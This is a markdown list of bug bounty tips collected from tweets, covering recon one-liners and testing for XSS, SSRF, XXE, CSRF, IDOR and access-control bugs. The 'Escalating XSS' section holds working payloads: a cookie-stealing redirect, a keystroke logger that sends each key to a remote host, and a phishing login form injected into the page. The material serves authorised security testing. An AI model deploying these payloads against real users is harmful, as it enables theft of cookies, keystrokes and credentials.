A curated list of technical/process tips that will level up your bounty game. For more, head [back to the main page](./README.md).

## Quick wordlist creation

Source: https://twitter.com/Bugcrowd/status/1362627992036519940

```
A quick one-liner that will gather + crawl all subdomains, then convert to a custom wordlist unique to that organisation based on discovered URLs!

subfinder -d bugcrowd[.]com -silent | httpx -silent | hakrawler -plain | tr "[:punct:]" "\n" | sort -u
```
You can also do that using [tok](https://github.com/tomnomnom/hacks/tok)

```
subfinder -d bugcrowd[.]com -silent | httpx -silent | hakrawler -plain | tok | sort -u
```

## Dumping URLs with regex

Source: https://twitter.com/Bugcrowd/status/1364809861964451849

```
Looking to quickly dump URLs from a webpage using curl and some regex magic!? Try: 

curl -s https://www.bugcrowd[.]com | pcregrep -o "(http:\/\/|https:\/\/).*?(?=\"|'| )" | sort -u
```

## alert(1) -> alert(document.domain)

Source: https://twitter.com/Bugcrowd/status/1367346572858695681

```
When you find an XSS, at minimum, use alert(document.domain) over alert(1). This helps to demonstrate the context that the JavaScript is executing in. Even better, escalate the XSS to perform an account takeover!
```

## SSRF -> Password Hashes

Source: https://twitter.com/Bugcrowd/status/1368320520526180355

```
If you ever find a SSRF on a Windows box, try running http://responder.py on your own VPS, then send the SSRF to file://<yourvps>. With a bit of luck, the server will send you some tasty Windows NetNTLMv2 hashes to crack!
```

## Common XXE Weakpoints

Source: https://twitter.com/Bugcrowd/status/1342184648856616972

```
XXE's are still quite common, and they're usually a P1! 
Here are places that you can look for them:

1. Uploading Open XML documents such as MS Offics docs (docx, xlsx, pptx). They're all just zip files filled with XML files. If these documents get parsed on the server-side, there's a chance that they will also parse external entities within those files.

2. Functionality that parses RSS feeds (they're XML too!)

3. Functionality that parses HTML (for example, converting HTML to PDF)

4.  Functionality that parses sitemap.xml files.

5. SAML requests.

6. Content-Type with application/json can also be replaced with application/xml. Many parsers support that.

7. SVG files (if they get parsed in some way on the server)
```

## Escalating XSS

Source: https://twitter.com/Bugcrowd/status/1339417608169222145

```
Here are a few ways to make the most of an XSS.

1. Grab the victim's cookies by redirecting to an attacker's server and appending the cookie value, e.g. document.location='bugcrowd.com/?'+document.cookie

2. Perform a sensitive action as the victim user (such as changing their password or email address). Having an XSS allows you to bypass SOP and Anti-CSRF mechanisms. See here for some payloads + inspiration: https://github.com/hakluke/weaponised-XSS-payloads

3. Plant a JavaScript keylogger (from https://github.com/swisskyrepo/PayloadsAllTheThings)
<img src=x onerror='document.onkeypress=function(e){fetch("http://bugcrowd.com/?k="+String.fromCharCode(e.which))},this.remove();'>

4. Redress the window with a fake HTML login form to phish credentials: document.body.innerHTML = "<form action='https://bugcrowd.com'><input type='text' value='email' name='email'><input type='password' value='password' name='password'><input type='submit'></form>"
```

## Find Leaky Password Reset Tokens

Source: https://twitter.com/hakluke/status/1300392121065594881

```
Try this when testing webapps:

1. Set up burp in browser1
2. Do a password reset request in browser1
3. Open the password reset email in browser2 and copy the token
4. Search your Burp history for the token, if it is there, you've got yourself a nice easy account takeover!
```

## Quick Way to Generate a Custom Wordlist

Source: https://twitter.com/hakluke/status/1301487471704776705

```
Easily generate a custom wordlist from any domain:

echo "http://bugcrowd.com" | subfinder -silent | hakrawler -plain -usewayback -scope yolo | sed $'s/[:./?=:]/\\\n/g' | anew
```

## Logic Bugs

Source: https://twitter.com/hakluke/status/1308365970780561408

```
Here's a solid bug bounty tip. If you are going to focus on one vulnerability class, make it logic bugs. Most of the P1 bugs I see pop up are logic errors that developers have made. They often have high impact and they can't be discovered through automation.

To find them you need to start by fully understanding the purpose of the application that you are attacking. Try to think about what the developer would have been thinking when they implemented each feature, then switch back to your hacker brain, where might they have made a mistake?
```

## Long-Term Collaborator

Source: https://twitter.com/stokfredrik/status/1314940154478501888

```
Hacky af long term burp collaborator with slack notifications. 
1. Run collaborator and tee output into a file
2. Bash loop the file for changes.
3. Negative grep out stuff you donâ€™t want like ns|www|mail and Smash that slack webhook with the data.
Yaaay long term monitoring...
```

## Recon via Google Analytics Codes

Source: https://twitter.com/hakluke/status/1330470167881469952

```
You can use this website to discover targets that use a particular Google Analytics code. This is a great way of discovering assets owned by a company.

1. Enter the domain or GA code into the website
2. Get results!

```

## Easy Recon for API with Mobile Apps

Source: https://twitter.com/discodamone

```
1. Decompile apk with:
jadx file.apk app/
2. Find endpoints in strings.xml or with regex
grep 'https\?://\|/api\|/v1'
3. Often times mobile apps interact with the API in ways that are different from the web app, these ways are usually less secure because less eyes have looked at them
```

## Finding Access Control Bugs

Source: https://twitter.com/hakluke/status/1339209648813981696

```
I've been finding a lot of access control bugs lately! Here's how.

Firstly I have two users, one with high privileges (admin), and one with low privileges (joe). I log in as the admin first, and use all the functionality. Whenever I do something that should be reserved for an administrator, I send the request over to Repeater. Once I have a stack of them, I get the cookies from the "joe" account and insert them into those requests. I send them and analyse the difference in response to see if it worked. If it did, I report it!

Then, I do the same thing but without any cookies or session tokens to see if it works unauthenticated.

You would be amazed at how many applications appear totally secure, and then there's just one or two endpoints that are vulnerable. This is because many web frameworks kind of suck at implementing roles and permissions. Web frameworks have been very successful at lessening the amount of injection vulnerabilities we see, but permissions still need to be defined by a human, so they're more prone to errors.

By the way - if you want to make this whole process 100x faster, check out the "Autorize" burp plugin. @Regala_ and @stokfredrik did a great video about it here: https://www.youtube.com/watch?v=3K1-a7dnA60&ab_channel=ST%C3%96K
```

## Finding IDOR Bugs Using Burp Match & Replace

```
Looking for an IDOR vulnerability but there are just too many requests to test manually using BURP repeater? 

An easier way to find them is to use BURP's match and replace settings. First find the ID of the object that you know your account can access, ID A, and the ID of some other object that you want to see if you can access, ID B.

Navigate to Burp Proxy -> Settings -> Match & Replace.
Add a new rule, with ID A going in the "match" box, and ID B in the "replace" box.

Then simply browse the application as usual. If you start to see 200 response codes or data being populated that isn't your own, you may have found an IDOR bug!
```

## Private Keys -> Private Repositories

Source: https://twitter.com/hakluke/status/1350021538142015490

```
If you ever find a SSH private key in a bounty program's assets, try using it to access the target's private Github repositories.

```

## CSRF Techniques

Source: https://twitter.com/hakluke/status/1350710129671344128

```
CSRF comes in many forms. Try:

- Removing the token parameter entirely
- Setting the token to a blank string
- Changing the token to an invalid token of the same format
- Using a different user's token
- Put the parameters in the URL instead of POST body (and remove the token) and change the HTTP verb to GET
- Testing every sensitive endpoint
- Check whether the token might be guessed / cracked
- Check whether new tokens are generated for every session, if not they may be a hash of something simple like the user's email address. If so you can craft your own valid tokens.
- Try building the payload with multiple methods including a standard HTML form, multipart form, and XHR (Burp can help)

Being thorough is the key - many devs are still implementing CSRF protections on a per-endpoint basis. When they do that, they're bound to forget somewhere!

## Wordpress Plugins

Source: https://twitter.com/Bugcrowd/status/1347015120287916032

```
Found a Wordpress site? The easiest place to find bugs is in the plugins.

1. Find the installed plugins with WPScan
2. Set up your own WP instance and install the same plugins
3. Hack your own instance
4. Report your bugs!

The most common bug you'll find with this method is XSS
```

## Finding the Correct Region for an S3 Bucket

Source: https://twitter.com/hakluke/status/1350553428242493440

```
If you find a S3 subdomain takeover, you need to set up the S3 bucket in the correct region, otherwise it doesn't work.

To find the region, use `dig` to get the IP address, then put the IP into https://isitonaws.com to grab the region easily.
```

## Find Special Access to certain API endpoints or temporary credentials

Source: https://twitter.com/EdOverflow/status/986316960303591424

```
Look for hackathon-related assets. Companies sometimes run hackathons and give attendees special access to certain API endpoints or temporary credentials. You could find GIT repositories that were set up for hackathons full of sensitive information.
```

## Stay Updated to New Features

Source: https://twitter.com/soaj1664ashar/status/1085118841359872000

```
Follow the marketing guys (e.g., Director or Manager) of the product you're targeting for #BugBounty. These guys are awesome in telling you all the new features that are in pipeline or just released. You will be the first to get your hands dirty.
```

## SQL Wildcards

```
Did you know that the character '_' acts like the regex character '.' in SQL queries. https://www.w3resource.com/sql/wildcards-like-operator/wildcards-underscore.php

Can be used to login to random account: https://twitter.com/gwendallecoguic/status/1076083109714710528

## Quick Privilege Escalation Technique

Source: https://twitter.com/uraniumhacker/status/1066483686655221761

```
If a website does not verify email, try signing up with @domain.com (the company email). Sometimes this gives you higher privilege like deleting/viewing any other user's profiles etc.
```
